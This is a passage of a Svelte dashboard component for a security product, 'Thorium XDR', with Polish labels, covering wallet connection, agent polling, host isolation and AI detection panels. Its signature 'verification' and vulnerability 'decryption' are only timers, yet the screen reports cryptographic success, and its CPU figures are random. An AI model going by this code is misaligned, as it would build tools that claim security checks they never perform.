      console.log("Standard wallets returned by getWallets():", registered.map(w => w.name));
      registered.forEach(w => {
        if (!list.some(item => item.name === w.name)) {
          list.push({ name: w.name, walletObj: w, type: "standard" });
        }
      });
    }

    // 2. Direct injection fallbacks for older/specific extension properties
    if (window.suiWallet && !list.some(w => w.name === "Sui Wallet")) {
      list.push({ name: "Sui Wallet", provider: window.suiWallet, type: "injected" });
    }
    if ((window.slush || window.slushWallet) && !list.some(w => w.name.toLowerCase().includes("slush"))) {
      list.push({ name: "Slush Wallet", provider: window.slush || window.slushWallet, type: "injected" });
    }
    if (window.okxwallet?.sui && !list.some(w => w.name.toLowerCase().includes("okx"))) {
      list.push({ name: "OKX Wallet", provider: window.okxwallet.sui, type: "injected" });
    }
    if (window.martian && !list.some(w => w.name.toLowerCase().includes("martian"))) {
      list.push({ name: "Martian Wallet", provider: window.martian, type: "injected" });
    }

    availableWallets = list;
  };

  const openWalletModal = () => {
    scanWallets();
    showWalletModal = true;
  };

  const connectWallet = async (wallet) => {
    connectingSlush = true;
    slushWalletAlert = "";
    try {
      if (wallet.type === "standard") {
        const connectFeature = wallet.walletObj.features["standard:connect"];
        if (!connectFeature) {
          throw new Error("Portfel nie obsługuje standardu standard:connect.");
        }
        await connectFeature.connect();
        const accounts = wallet.walletObj.accounts;
        if (accounts && accounts.length > 0) {
          slushAddress = accounts[0].address;
          isSlushConnected = true;
          showWalletModal = false;
        } else {
          throw new Error("Portfel nie udostępnił żadnych adresów.");
        }
      } else if (wallet.type === "injected") {
        const provider = wallet.provider;
        if (typeof provider.connect === "function") {
          await provider.connect();
        } else if (typeof provider.requestPermissions === "function") {
          await provider.requestPermissions();
        }
        
        const accounts = await provider.getAccounts();
        if (accounts && accounts.length > 0) {
          slushAddress = accounts[0];
          isSlushConnected = true;
          showWalletModal = false;
        } else {
          throw new Error("Brak dostępnych adresów w portfelu.");
        }
      } else if (wallet.type === "dev") {
        isSlushConnected = true;
        slushAddress = "0x8dba82e1de74f0a996f8c7b8a7b97c02b9ffab55";
        showWalletModal = false;
      }
    } catch (err) {
      console.error("Wallet connection error:", err);
      slushWalletAlert = "Błąd połączenia: " + (err.message || err.toString());
    } finally {
      connectingSlush = false;
    }
  };

  const disconnectSlush = () => {
    isSlushConnected = false;
    slushAddress = "";
    isVulnerabilitiesDecrypted = false;
  };

  const handleDecryptVulnerabilities = () => {
    if (!isSlushConnected) {
      slushWalletAlert = "Brak autoryzacji: Podłącz portfel Slush, aby uzyskać dostęp do kluczy deszyfrujących Foki (Sui Seal).";
      return;
    }
    slushWalletAlert = "";
    decryptingVulnerabilities = true;
    setTimeout(() => {
      decryptingVulnerabilities = false;
      isVulnerabilitiesDecrypted = true;
    }, 1200);
  };

  const handleLockVulnerabilities = () => {
    isVulnerabilitiesDecrypted = false;
  };

  const verifyFoka = (inferenceId: string) => {
    verifyingInferenceId = inferenceId;
    verificationStatus = "Weryfikowanie podpisu Foki (Sui Seal) on-chain za pomocą zarejestrowanego klucza publicznego...";
    showFokaVerificationModal = true;
    setTimeout(() => {
      verificationStatus = "Sukces! Kryptograficzna pieczęć Foki (Sui Seal) jest w pełni poprawna i nienaruszona. Dostęp autoryzowany przez kontrakt talus_xdr_detector.";
    }, 1500);
  };

  const closeFokaVerification = () => {
    showFokaVerificationModal = false;
    verificationStatus = null;
    verifyingInferenceId = null;
  };

  interface Agent {
    id: string;
    fullId: string;
    hwHash: string;
    status: string;
    load: number;
    hardware: any;
    owner_name: string;
    machine_type: string;
    hostname: string;
    ip_address: string;
    endpoint: string;
  }

  let fetchError: string | null = null;

  // Selected Agent for Modal context
  let selectedAgentForLogs: Agent | null = null;

  // Logs Modal State
  let showLogsModal = false;
  let liveLogs = "";
  let logInterval: any = null;

  const openLogs = (agent: Agent) => {
    selectedAgentForLogs = agent;
    showLogsModal = true;
    fetchLogs();
    if (logInterval) clearInterval(logInterval);
    logInterval = setInterval(fetchLogs, 1000);
  };

  const closeLogs = () => {
    showLogsModal = false;
    selectedAgentForLogs = null;
    if (logInterval) clearInterval(logInterval);
  };

  // Hardware Modal State
  let showHardwareModal = false;
  let hardwareDetails: any = null;

  const openHardware = (agent: Agent) => {
    if (agent && agent.hardware) {
      hardwareDetails = agent.hardware;
    } else {
      hardwareDetails = null;
    }
    showHardwareModal = true;
  };

  const closeHardware = () => {
    showHardwareModal = false;
  };

  const fetchLogs = async () => {
    if (!showLogsModal || !selectedAgentForLogs) return;
    try {
      const targetUrl = selectedAgentForLogs.endpoint 
        ? `${selectedAgentForLogs.endpoint}/api/rpc`
        : "/api/rpc";

      const res = await fetch(targetUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          jsonrpc: "2.0",
          method: "get_logs",
          params: {},
          id: 1,
        }),
      });
      if (res.ok) {
        const data = await res.json();
        if (data.result && data.result.logs) {
          liveLogs = data.result.logs;
        } else if (data.error) {
          liveLogs = `RPC Error: ${data.error.message}`;
        } else {
          liveLogs = "Invalid RPC response format";
        }
      }
    } catch (err) {
      liveLogs = `Błąd łączenia z Agentem via RPC (${selectedAgentForLogs.id})...`;
    }
  };

  const isolateHost = async (agent: Agent) => {
    try {
      const targetUrl = agent.endpoint 
        ? `${agent.endpoint}/api/izoluj` 
        : "/api/izoluj";
      const res = await fetch(targetUrl);
      if (res.ok) {
        agent.status = "Isolated";
        agents = [...agents];
      }
    } catch (_) {}
  };

  const restoreHost = async (agent: Agent) => {
    try {
      const targetUrl = agent.endpoint 
        ? `${agent.endpoint}/api/przywroc` 
        : "/api/przywroc";
      const res = await fetch(targetUrl);
      if (res.ok) {
        agent.status = "Active";
        agents = [...agents];
      }
    } catch (_) {}
  };

  onMount(() => {
    // Fetch real on-chain transaction events from Sui Testnet
    fetchOnChainPolicyTransactions();

    const pollAgent = async () => {
      let tempAgents: Agent[] = [];
      
      // 1. Fetch Local Node (from /api/status)
      try {
        const res = await fetch("/api/status");
        if (res.ok) {
          const data = await res.json();
          tempAgents.push({
            id: "Local Node: " + data.klucz_pub.substring(0, 8) + "...",
            fullId: data.klucz_pub,
            hwHash: "blake3:" + data.fingerprint.substring(0, 10) + "...",
            status: data.status === "Izolowany" ? "Isolated" : "Active",
            load: Math.floor(Math.random() * 20) + 5,
            hardware: data.hardware,
            owner_name: data.owner_name,
            machine_type: data.machine_type,
            hostname: data.hostname,
            ip_address: data.ip_address || "127.0.0.1",
            endpoint: ""
          });
          fetchError = null;
        }
      } catch (err) {
        fetchError = "Cannot connect to local proxy agent on port 9090";
      }

      // 2. Fetch VM fleet list (from /api/vm/lista)
      try {
        const res = await fetch("/api/vm/lista");
        if (res.ok) {
          const vmsData = await res.json();
          if (Array.isArray(vmsData)) {
            for (const vm of vmsData) {
              const endpoint = vm.ip_address 
                ? `http://[${vm.ip_address}]:9090` 
                : `http://127.0.0.1:${vm.host_port}`;
                
              if (vm.status === "running") {
                try {
                  const agentRes = await fetch(`${endpoint}/api/status`, { signal: AbortSignal.timeout(1000) });
                  if (agentRes.ok) {
                    const data = await agentRes.json();
                    tempAgents.push({
                      id: `${vm.name}: ${data.klucz_pub.substring(0, 8)}...`,
                      fullId: data.klucz_pub,
                      hwHash: "blake3:" + data.fingerprint.substring(0, 10) + "...",
                      status: data.status === "Izolowany" ? "Isolated" : "Active",
                      load: Math.floor(Math.random() * 25) + 3,
                      hardware: data.hardware,
                      owner_name: data.owner_name || vm.owner_name || "Jakub",
                      machine_type: data.machine_type || "Server",
                      hostname: data.hostname || vm.name,
                      ip_address: data.ip_address || vm.ip_address,
                      endpoint: endpoint
                    });
                  } else {
                    tempAgents.push({
                      id: `${vm.name} (Agent Offline)`,
                      fullId: vm.name,
                      hwHash: "unknown",
                      status: "Offline",
                      load: 0,
                      hardware: null,
                      owner_name: "Unknown",
                      machine_type: "Server",
                      hostname: vm.name,
                      ip_address: vm.ip_address,
                      endpoint: endpoint
                    });
                  }
                } catch (_) {
                  tempAgents.push({
                    id: `${vm.name} (Connecting...)`,
                    fullId: vm.name,
                    hwHash: "unknown",
                    status: "Offline",
                    load: 0,
                    hardware: null,
                    owner_name: "Unknown",
                    machine_type: "Server",
                    hostname: vm.name,
                    ip_address: vm.ip_address,
                    endpoint: endpoint
                  });
                }
              } else {
                tempAgents.push({
                  id: `${vm.name} (Stopped)`,
                  fullId: vm.name,
                  hwHash: "n/a",
                  status: "Stopped",
                  load: 0,
                  hardware: null,
                  owner_name: "Unknown",
                  machine_type: "Server",
                  hostname: vm.name,
                  ip_address: vm.ip_address,
                  endpoint: ""
                });
              }
            }
          }
        }
      } catch (_) {}

      if (tempAgents.length > 0) {
        agents = tempAgents;
      }
    };

    pollAgent();
    const interval = setInterval(pollAgent, 2000);
    return () => clearInterval(interval);
  });
</script>

<main class="dashboard">
  <!-- Sidebar -->
  <aside class="sidebar glass-panel">
    <div class="logo-container">
      <div class="logo-icon">🛡️</div>
      <h1 class="logo-text glow-text">
        Thorium <span class="accent">XDR</span>
      </h1>
    </div>

    <nav class="nav-menu">
      <button
        class="nav-item"
        class:active={activeTab === "overview"}
        on:click={() => (activeTab = "overview")}
      >
        <span class="icon">📊</span> Overview
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "vms"}
        on:click={() => (activeTab = "vms")}
      >
        <span class="icon">🖥️</span> VM Fleet
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "incidents"}
        on:click={() => (activeTab = "incidents")}
      >
        <span class="icon">🚨</span> Incidents
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "endpoints"}
        on:click={() => (activeTab = "endpoints")}
      >
        <span class="icon">💻</span> Endpoints
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "talus"}
        on:click={() => (activeTab = "talus")}
      >
        <span class="icon">🤖</span> Talus AI
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "vulnerabilities"}
        on:click={() => (activeTab = "vulnerabilities")}
      >
        <span class="icon">🦭</span> Podatności
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "polonium"}
        on:click={() => (activeTab = "polonium")}
      >
        <span class="icon">🛡️</span> Polonium (Polityki)
      </button>
      <button
        class="nav-item"
        class:active={activeTab === "helium"}
        on:click={() => (activeTab = "helium")}
      >
        <span class="icon">🏢</span> Organizacja (Helium)
      </button>
    </nav>

    <div class="network-status">
      <div class="status-dot"></div>
      <span>Sui Testnet Connected</span>
      <div class="contract-address">{address}</div>
    </div>
  </aside>

  <!-- Main Content -->
  <section class="content">
    <header class="top-bar">
      <h2>
        {activeTab === "vms"
          ? "VM Fleet Manager"
          : activeTab === "incidents"
            ? "Incident Feed"
            : activeTab === "endpoints"
              ? "Monitored Endpoints"
              : activeTab === "talus"
                ? "Talus AI Inferences"
                : activeTab === "vulnerabilities"
                  ? "Vulnerability Registry"
                  : activeTab === "polonium"
                    ? "Polonium Policy Panel"
                    : activeTab === "helium"
                      ? "Helium Organizational Tenant"
                      : "Security Overview"}
      </h2>
      <div class="user-profile" style="display: flex; gap: 12px; align-items: center;">
        {#if !isSlushConnected}
          <button class="btn-primary" style="background: linear-gradient(135deg, #38bdf8 0%, #0369a1 100%); border: none; color: white; padding: 6px 14px; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 6px; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 12px rgba(56, 189, 248, 0.2);" on:click={openWalletModal} disabled={connectingSlush}>
            {#if connectingSlush}
              🔄 Łączenie...
            {:else}
              🔌 Połącz Slush Wallet
            {/if}
          </button>
        {:else}
          <div style="background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.3); padding: 6px 12px; border-radius: 8px; display: flex; align-items: center; gap: 8px;">
            <span style="font-size: 13px; color: #94a3b8;">❄️ Slush:</span>
            <code style="color: #38bdf8; font-size: 12px; font-family: monospace;">{slushAddress.substring(0,6)}...{slushAddress.substring(36)}</code>
            <button style="background: none; border: none; color: #ef4444; font-size: 12px; cursor: pointer; padding: 0; margin-left: 4px; display: flex; align-items: center;" on:click={disconnectSlush} title="Odłącz portfel">✕</button>
          </div>
        {/if}
        <div class="avatar" style="margin-left: 8px;">👨‍💻</div>
        <span style="font-size: 13px; font-weight: 600; color: #cbd5e1;">Admin C2</span>
      </div>
    </header>

    <!-- Overview Tab -->
    {#if activeTab === "overview"}
      <!-- Stats Grid -->
      <div class="stats-grid">
        <div class="stat-card glass-panel">
          <div class="stat-title">Active Agents</div>
          <div class="stat-value">24</div>
          <div class="stat-trend positive">↑ 3 this week</div>
        </div>
        <div class="stat-card glass-panel alert-pulse">
          <div class="stat-title">Critical Threats</div>
          <div class="stat-value text-red">1</div>
          <div class="stat-trend negative">Require attention</div>
        </div>
        <div class="stat-card glass-panel">
          <div class="stat-title">Files Quarantined</div>
          <div class="stat-value">142</div>
          <div class="stat-trend neutral">Last 30 days</div>
        </div>
        <div class="stat-card glass-panel">
          <div class="stat-title">Total Processed (PTB)</div>
          <div class="stat-value">8,932</div>
          <div class="stat-trend positive">Transactions batched</div>
        </div>
      </div>

      <div class="panels-grid">
        <!-- Agents Status -->
        <div class="panel glass-panel">
          <div class="panel-header">
            <h3>💻 Monitored Endpoints (SBT)</h3>
            {#if fetchError}
              <span style="color: #ef4444; font-size: 12px;">{fetchError}</span>
            {/if}
          </div>
          <div class="agent-list">
            {#each agents as agent}
              <div class="agent-card" style={agent.status === "Active" ? "border: 1px solid #10b981; background: rgba(16, 185, 129, 0.03);" : agent.status === "Isolated" ? "border: 1px solid #ef4444; background: rgba(239, 68, 68, 0.03);" : ""}>
                <div class="agent-header">
                  <div class="agent-id">{agent.id}</div>
                  <div class="agent-status {agent.status.toLowerCase()}">
                    {agent.status}
                  </div>
                </div>
                <div class="agent-body">
                  {#if agent.hostname}
                    <div><strong>Hostname:</strong> <code style="color: #f1f5f9;">{agent.hostname}</code></div>
                  {/if}
                  {#if agent.owner_name}
                    <div><strong>Owner:</strong> <span style="color: #e2e8f0;">{agent.owner_name}</span></div>
                  {/if}
                  {#if agent.machine_type}
                    <div><strong>Type:</strong> <span style="color: #e2e8f0;">{agent.machine_type}</span></div>
                  {/if}
                  {#if agent.ip_address}
                    <div><strong>IP Address:</strong> <code style="color: #e2e8f0;">{agent.ip_address}</code></div>
                  {/if}
                  <div><strong>Hash:</strong> <code>{agent.hwHash}</code></div>
                  
                  {#if agent.status !== "Offline" && agent.status !== "Stopped"}
                    <div class="load-bar-container">
                      <span style="font-size: 12px; color: #94a3b8; font-weight: 600;">CPU Load:</span>
                      <div class="load-bar" style="height: 8px; flex: 1;">
                        <div class="load-fill" style="width: {agent.load}%"></div>
                      </div>
                      <span style="font-size: 12px; font-weight: 700; color: #e2e8f0;">{agent.load}%</span>
                    </div>
                  {/if}
                </div>
                <div class="agent-actions" style="margin-top: 12px; display: flex; gap: 8px; justify-content: flex-end;">
                  {#if agent.status === "Active" || agent.status === "Isolated"}
                    <button
                      class="btn-primary"
                      style="background: rgba(56, 189, 248, 0.1); border: 1px solid #38bdf8; color: #38bdf8; padding: 6px 12px; font-size: 12px;"
                      on:click={() => openLogs(agent)}>View Logs</button
                    >
                    <button
                      class="btn-primary"
                      style="background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 12px; font-size: 12px;"
                      on:click={() => openHardware(agent)}>View Hardware</button
                    >
                    {#if agent.status === "Active"}
                      <button
                        class="btn-danger"
                        style="padding: 6px 12px; font-size: 12px;"
                        on:click={() => isolateHost(agent)}>Isolate Host</button
                      >
                    {:else}
                      <button
                        class="btn-primary"
                        style="background: #10b981; padding: 6px 12px; font-size: 12px;"
                        on:click={() => restoreHost(agent)}>Restore Host</button
                      >
                    {/if}
                  {:else}
                    <button class="btn-primary" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #94a3b8; cursor: not-allowed; padding: 6px 12px; font-size: 12px;" disabled>View Logs</button>
                    <button class="btn-primary" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #94a3b8; cursor: not-allowed; padding: 6px 12px; font-size: 12px;" disabled>View Hardware</button>
                  {/if}
                </div>
              </div>
            {/each}</div>
        </div>

        <!-- Live Incidents Feed -->
        <div class="panel glass-panel">
          <div class="panel-header">
            <h3>🚨 Live Incident Feed (On-Chain)</h3>
            <button
              class="btn-primary"
              style="font-size: 12px; padding: 4px 8px;">Refresh</button
            >
          </div>
          <div class="incident-list">
            {#each incidents as incident}
              <div
                class="incident-row"
                style="animation: slideIn 0.3s ease forwards;"
              >
                <div class="severity-badge {incident.severity.toLowerCase()}">
                  {incident.severity}
                </div>
                <div class="incident-details">
                  <div class="incident-cmd"><code>{incident.cmd}</code></div>
                  <div class="incident-meta">
                    Agent: {incident.agent} • Action:
                    <span class="action-text">{incident.action}</span>
                  </div>
                </div>
                <div class="incident-time">{incident.time}</div>
                <button
                  class="btn-primary"
                  style="background: transparent; border: 1px solid #3b82f6; color: #3b82f6;"
                  >Investigate</button
                >
              </div>
            {/each}
          </div>
        </div>
      </div>
    {/if}

    <!-- VM Fleet Tab -->
    {#if activeTab === "vms"}
      <div class="vm-tab-panel">
        <VMManager />
      </div>
    {/if}

    <!-- Endpoints Tab -->
    {#if activeTab === "endpoints"}
      <div class="vm-tab-panel">
        <div class="panel glass-panel" style="width: 100%; min-height: 100%; box-sizing: border-box;">
          <div class="panel-header">
            <h3>💻 Monitored Endpoints (SBT)</h3>
            {#if fetchError}
              <span style="color: #ef4444; font-size: 12px;">{fetchError}</span>
            {/if}
          </div>
          <div class="agent-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; margin-top: 16px;">
            {#each agents as agent}
              <div class="agent-card" style={agent.status === "Active" ? "border: 1px solid #10b981; background: rgba(16, 185, 129, 0.03); display: flex; flex-direction: column;" : agent.status === "Isolated" ? "border: 1px solid #ef4444; background: rgba(239, 68, 68, 0.03); display: flex; flex-direction: column;" : "background: rgba(255, 255, 255, 0.02); display: flex; flex-direction: column;"}>
                <div class="agent-header">
                  <div class="agent-id" style="font-size: 14px; font-weight: 700;">{agent.id}</div>
                  <div class="agent-status {agent.status.toLowerCase()}">
                    {agent.status}
                  </div>
                </div>
                <div class="agent-body" style="gap: 12px; flex: 1;">
                  {#if agent.hostname}
                    <div><strong>Hostname:</strong> <code style="color: #f1f5f9;">{agent.hostname}</code></div>
                  {/if}
                  {#if agent.owner_name}
                    <div><strong>Owner:</strong> <span style="color: #e2e8f0;">{agent.owner_name}</span></div>
                  {/if}
                  {#if agent.machine_type}
                    <div><strong>Type:</strong> <span style="color: #e2e8f0;">{agent.machine_type}</span></div>
                  {/if}
                  {#if agent.ip_address}
                    <div><strong>IP Address:</strong> <code style="color: #e2e8f0;">{agent.ip_address}</code></div>
                  {/if}
                  <div><strong>Hardware Hash:</strong> <code>{agent.hwHash}</code></div>
                  
                  {#if agent.status !== "Offline" && agent.status !== "Stopped"}
                    <div class="load-bar-container">
                      <span style="font-size: 12px; color: #94a3b8; font-weight: 600;">CPU Load:</span>
                      <div class="load-bar" style="height: 6px; flex: 1;">
                        <div class="load-fill" style="width: {agent.load}%"></div>
                      </div>
                      <span style="font-size: 12px; color: #e2e8f0;">{agent.load}%</span>
                    </div>
                  {/if}
                </div>
                <div class="agent-actions" style="margin-top: 16px; border-top: 1px solid rgba(255, 255, 255, 0.06); padding-top: 12px; display: flex; gap: 8px; justify-content: flex-end;">
                  {#if agent.status === "Active" || agent.status === "Isolated"}
                    <button
                      class="btn-primary"
                      style="background: rgba(56, 189, 248, 0.1); border: 1px solid #38bdf8; color: #38bdf8; padding: 6px 12px; font-size: 12px;"
                      on:click={() => openLogs(agent)}>View Logs</button
                    >
                    <button
                      class="btn-primary"
                      style="background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 12px; font-size: 12px;"
                      on:click={() => openHardware(agent)}>View Hardware</button
                    >
                    {#if agent.status === "Active"}
                      <button
                        class="btn-danger"
                        style="padding: 6px 12px; font-size: 12px;"
                        on:click={() => isolateHost(agent)}>Isolate Host</button
                      >
                    {:else}
                      <button
                        class="btn-primary"
                        style="background: #10b981; padding: 6px 12px; font-size: 12px;"
                        on:click={() => restoreHost(agent)}>Restore Host</button
                      >
                    {/if}
                  {:else}
                    <button class="btn-primary" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #94a3b8; cursor: not-allowed; padding: 6px 12px; font-size: 12px;" disabled>View Logs</button>
                    <button class="btn-primary" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); color: #94a3b8; cursor: not-allowed; padding: 6px 12px; font-size: 12px;" disabled>View Hardware</button>
                  {/if}
                </div>
              </div>
            {/each}
          </div>
        </div>
      </div>
    {/if}

    <!-- Talus AI Tab -->
    {#if activeTab === "talus"}
      <div class="vm-tab-panel">
        <div class="panel glass-panel" style="width: 100%; box-sizing: border-box; display: flex; flex-direction: column; gap: 20px;">
          <div class="panel-header" style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.1); padding-bottom: 16px;">
            <div>
              <h3 style="margin: 0; font-size: 18px; font-weight: 600; display: flex; align-items: center; gap: 8px;">🤖 Wnioski detekcji Talus AI</h3>
              <p style="margin: 4px 0 0 0; font-size: 12px; color: #94a3b8;">
                ⚠️ Wszystkie dane decyzyjne i telemetria są szyfrowane i kontrolowane przez kryptograficzny system <strong>Foki (Sui Seal)</strong>.
              </p>
            </div>
            <div style="background: rgba(56, 189, 248, 0.1); border: 1px solid rgba(56, 189, 248, 0.3); padding: 8px 16px; border-radius: 8px; display: flex; align-items: center; gap: 8px;">
              <span style="font-size: 14px; color: #38bdf8; font-weight: 600;">Próg anomalii:</span>
              <input type="number" bind:value={anomalyThreshold} min="1" max="100" style="width: 60px; background: rgba(0, 0, 0, 0.5); border: 1px solid rgba(255, 255, 255, 0.2); color: white; padding: 4px 8px; border-radius: 4px; text-align: center;" />
              <span style="font-size: 12px; color: #94a3b8;">%</span>
            </div>
          </div>

          <div style="display: flex; flex-direction: column; gap: 16px;">
            {#each talusInferences as inf}
              <div style="background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; gap: 16px;">
                <div style="display: flex; justify-content: space-between; align-items: flex-start; gap: 16px;">
                  <div>
                    <span style="font-size: 11px; background: rgba(56, 189, 248, 0.15); color: #38bdf8; padding: 2px 6px; border-radius: 4px; font-weight: 700; font-family: monospace;">{inf.id}</span>
                    <h4 style="margin: 8px 0 4px 0; font-size: 16px; font-weight: 700; color: #f1f5f9;">{inf.model}</h4>
                    <p style="margin: 0; font-size: 13px; color: #94a3b8;">
                      Host docelowy: <strong style="color: #e2e8f0;">{inf.host}</strong> ({inf.ip})
                    </p>
                  </div>
                  <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 4px;">
                    <span class="severity-badge {inf.classification === 'MALICIOUS' ? 'critical' : inf.classification === 'SUSPICIOUS' ? 'high' : 'low'}" style="margin: 0; padding: 6px 12px; border-radius: 6px; font-weight: 800; font-size: 12px;">
                      {inf.classification}
                    </span>
                    <span style="font-size: 12px; color: #94a3b8;">{inf.time}</span>
                  </div>
                </div>

                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; background: rgba(0, 0, 0, 0.2); padding: 16px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.03);">
                  <div>
                    <div style="font-size: 11px; color: #64748b; text-transform: uppercase; font-weight: 700;">Wynik Anomalii (Score)</div>
                    <div style="font-size: 20px; font-weight: 800; margin-top: 4px; display: flex; align-items: center; gap: 8px; color: {inf.score >= anomalyThreshold ? '#ef4444' : inf.score >= 50 ? '#f59e0b' : '#10b981'};">
                      {inf.score}%
                      <div style="width: 60px; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; display: inline-block;">
                        <div style="height: 100%; width: {inf.score}%; background: currentColor;"></div>
                      </div>
                    </div>
                  </div>
                  <div>
                    <div style="font-size: 11px; color: #64748b; text-transform: uppercase; font-weight: 700;">Status Foki (Sui Seal)</div>
                    <div style="font-size: 13px; font-weight: 600; margin-top: 8px; color: #10b981; display: flex; align-items: center; gap: 6px;">
                      🛡️ {inf.fokaStatus}
                    </div>
                  </div>
                  <div>
                    <div style="font-size: 11px; color: #64748b; text-transform: uppercase; font-weight: 700;">Akcja Odpowiedzi</div>
                    <div style="font-size: 14px; font-weight: 700; margin-top: 8px; color: {inf.action === 'TRIGGER_ISOLATION' ? '#ef4444' : '#94a3b8'};">
                      {inf.action === 'TRIGGER_ISOLATION' ? '🚫 IZOLACJA WĘZŁA' : '⚙️ MONITOROWANIE'}
                    </div>
                  </div>
                </div>

                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #64748b; border-top: 1px solid rgba(255, 255, 255, 0.05); padding-top: 12px;">
                  <span style="font-family: monospace; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; max-width: 70%;">Pieczęć (Foka): {inf.fokaSignature}</span>
                  <button class="btn-primary" style="background: rgba(56, 189, 248, 0.1); border: 1px solid #38bdf8; color: #38bdf8; padding: 6px 12px; font-size: 12px;" on:click={() => verifyFoka(inf.id)}>
                    Zweryfikuj Fokę
                  </button>
                </div>
              </div>
            {/each}
          </div>
        </div>
      </div>
    {/if}

    <!-- Polonium Tab -->
    {#if activeTab === "polonium"}
      {#if selectedAuditLog}
        {@const details = getLogDetails(selectedAuditLog)}
        <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.65); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 1000;">
          <div class="modal-content glass-panel" style="max-width: 550px; width: 90%; padding: 28px; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; background: rgba(15, 23, 42, 0.96); display: flex; flex-direction: column; gap: 20px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);">
            
            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255, 255, 255, 0.08); padding-bottom: 16px;">
              <h3 style="margin: 0; font-size: 16px; font-weight: 700; color: #f1f5f9; display: flex; align-items: center; gap: 8px;">
                🔍 Audyt i Weryfikacja Polityki Polonium
              </h3>
              <button style="background: none; border: none; color: #94a3b8; font-size: 18px; cursor: pointer;" on:click={() => selectedAuditLog = null}>✕</button>
            </div>

            <div style="background: rgba(255, 255, 255, 0.01); border: 1px solid rgba(255, 255, 255, 0.04); border-radius: 10px; padding: 16px; display: flex; flex-direction: column; gap: 12px; font-size: 12px;">
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Skrót Tx (Sui):</span>
                <span style="font-family: monospace; color: #38bdf8;">{selectedAuditLog.tx}</span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Czas transakcji:</span>
                <span style="color: #cbd5e1;">{selectedAuditLog.time}</span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Walrus Blob ID:</span>
                <span style="font-family: monospace; color: #38bdf8; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; max-width: 260px;" title={details.walrusBlob}>
                  {details.walrusBlob}
                </span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">SHA-256 Hash:</span>
                <span style="font-family: monospace; color: #cbd5e1; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; max-width: 260px;" title={details.policyHash}>
                  {details.policyHash}
                </span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Ilość haszy (Min - Max):</span>
                <span style="color: #38bdf8; font-weight: 600;">{details.minHashes} - {details.maxHashes} haszy</span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Lokalna analiza AI:</span>
                <span style="color: {details.localAI ? '#10b981' : '#f59e0b'}; font-weight: 600;">
                  {details.localAI ? '🟢 Włączona (Talus AI)' : '🟡 Wyłączona'}
                </span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Szablon Zgodności:</span>
                <span style="color: #cbd5e1; font-weight: 600; text-transform: uppercase;">{details.complianceTemplate || 'custom'}</span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Szyfrowanie (Dane / Sieć):</span>
                <span style="color: #38bdf8;">{details.dataRest || 'Brak'} / {details.network || 'Brak'}</span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Grupy Reagowania / Aktualizacje:</span>
                <span style="color: #cbd5e1;">{details.irGroups || 'brak'} / max {details.patchDelay || 14} dni</span>
              </div>
              <div style="display: flex; justify-content: space-between; border-bottom: 1px solid rgba(255, 255, 255, 0.03); padding-bottom: 6px;">
                <span style="color: #64748b;">Log Retencja / Skanowanie:</span>
                <span style="color: #cbd5e1;">{details.logRetention || 90} dni / {details.vulnCycle || 'daily'}</span>
              </div>
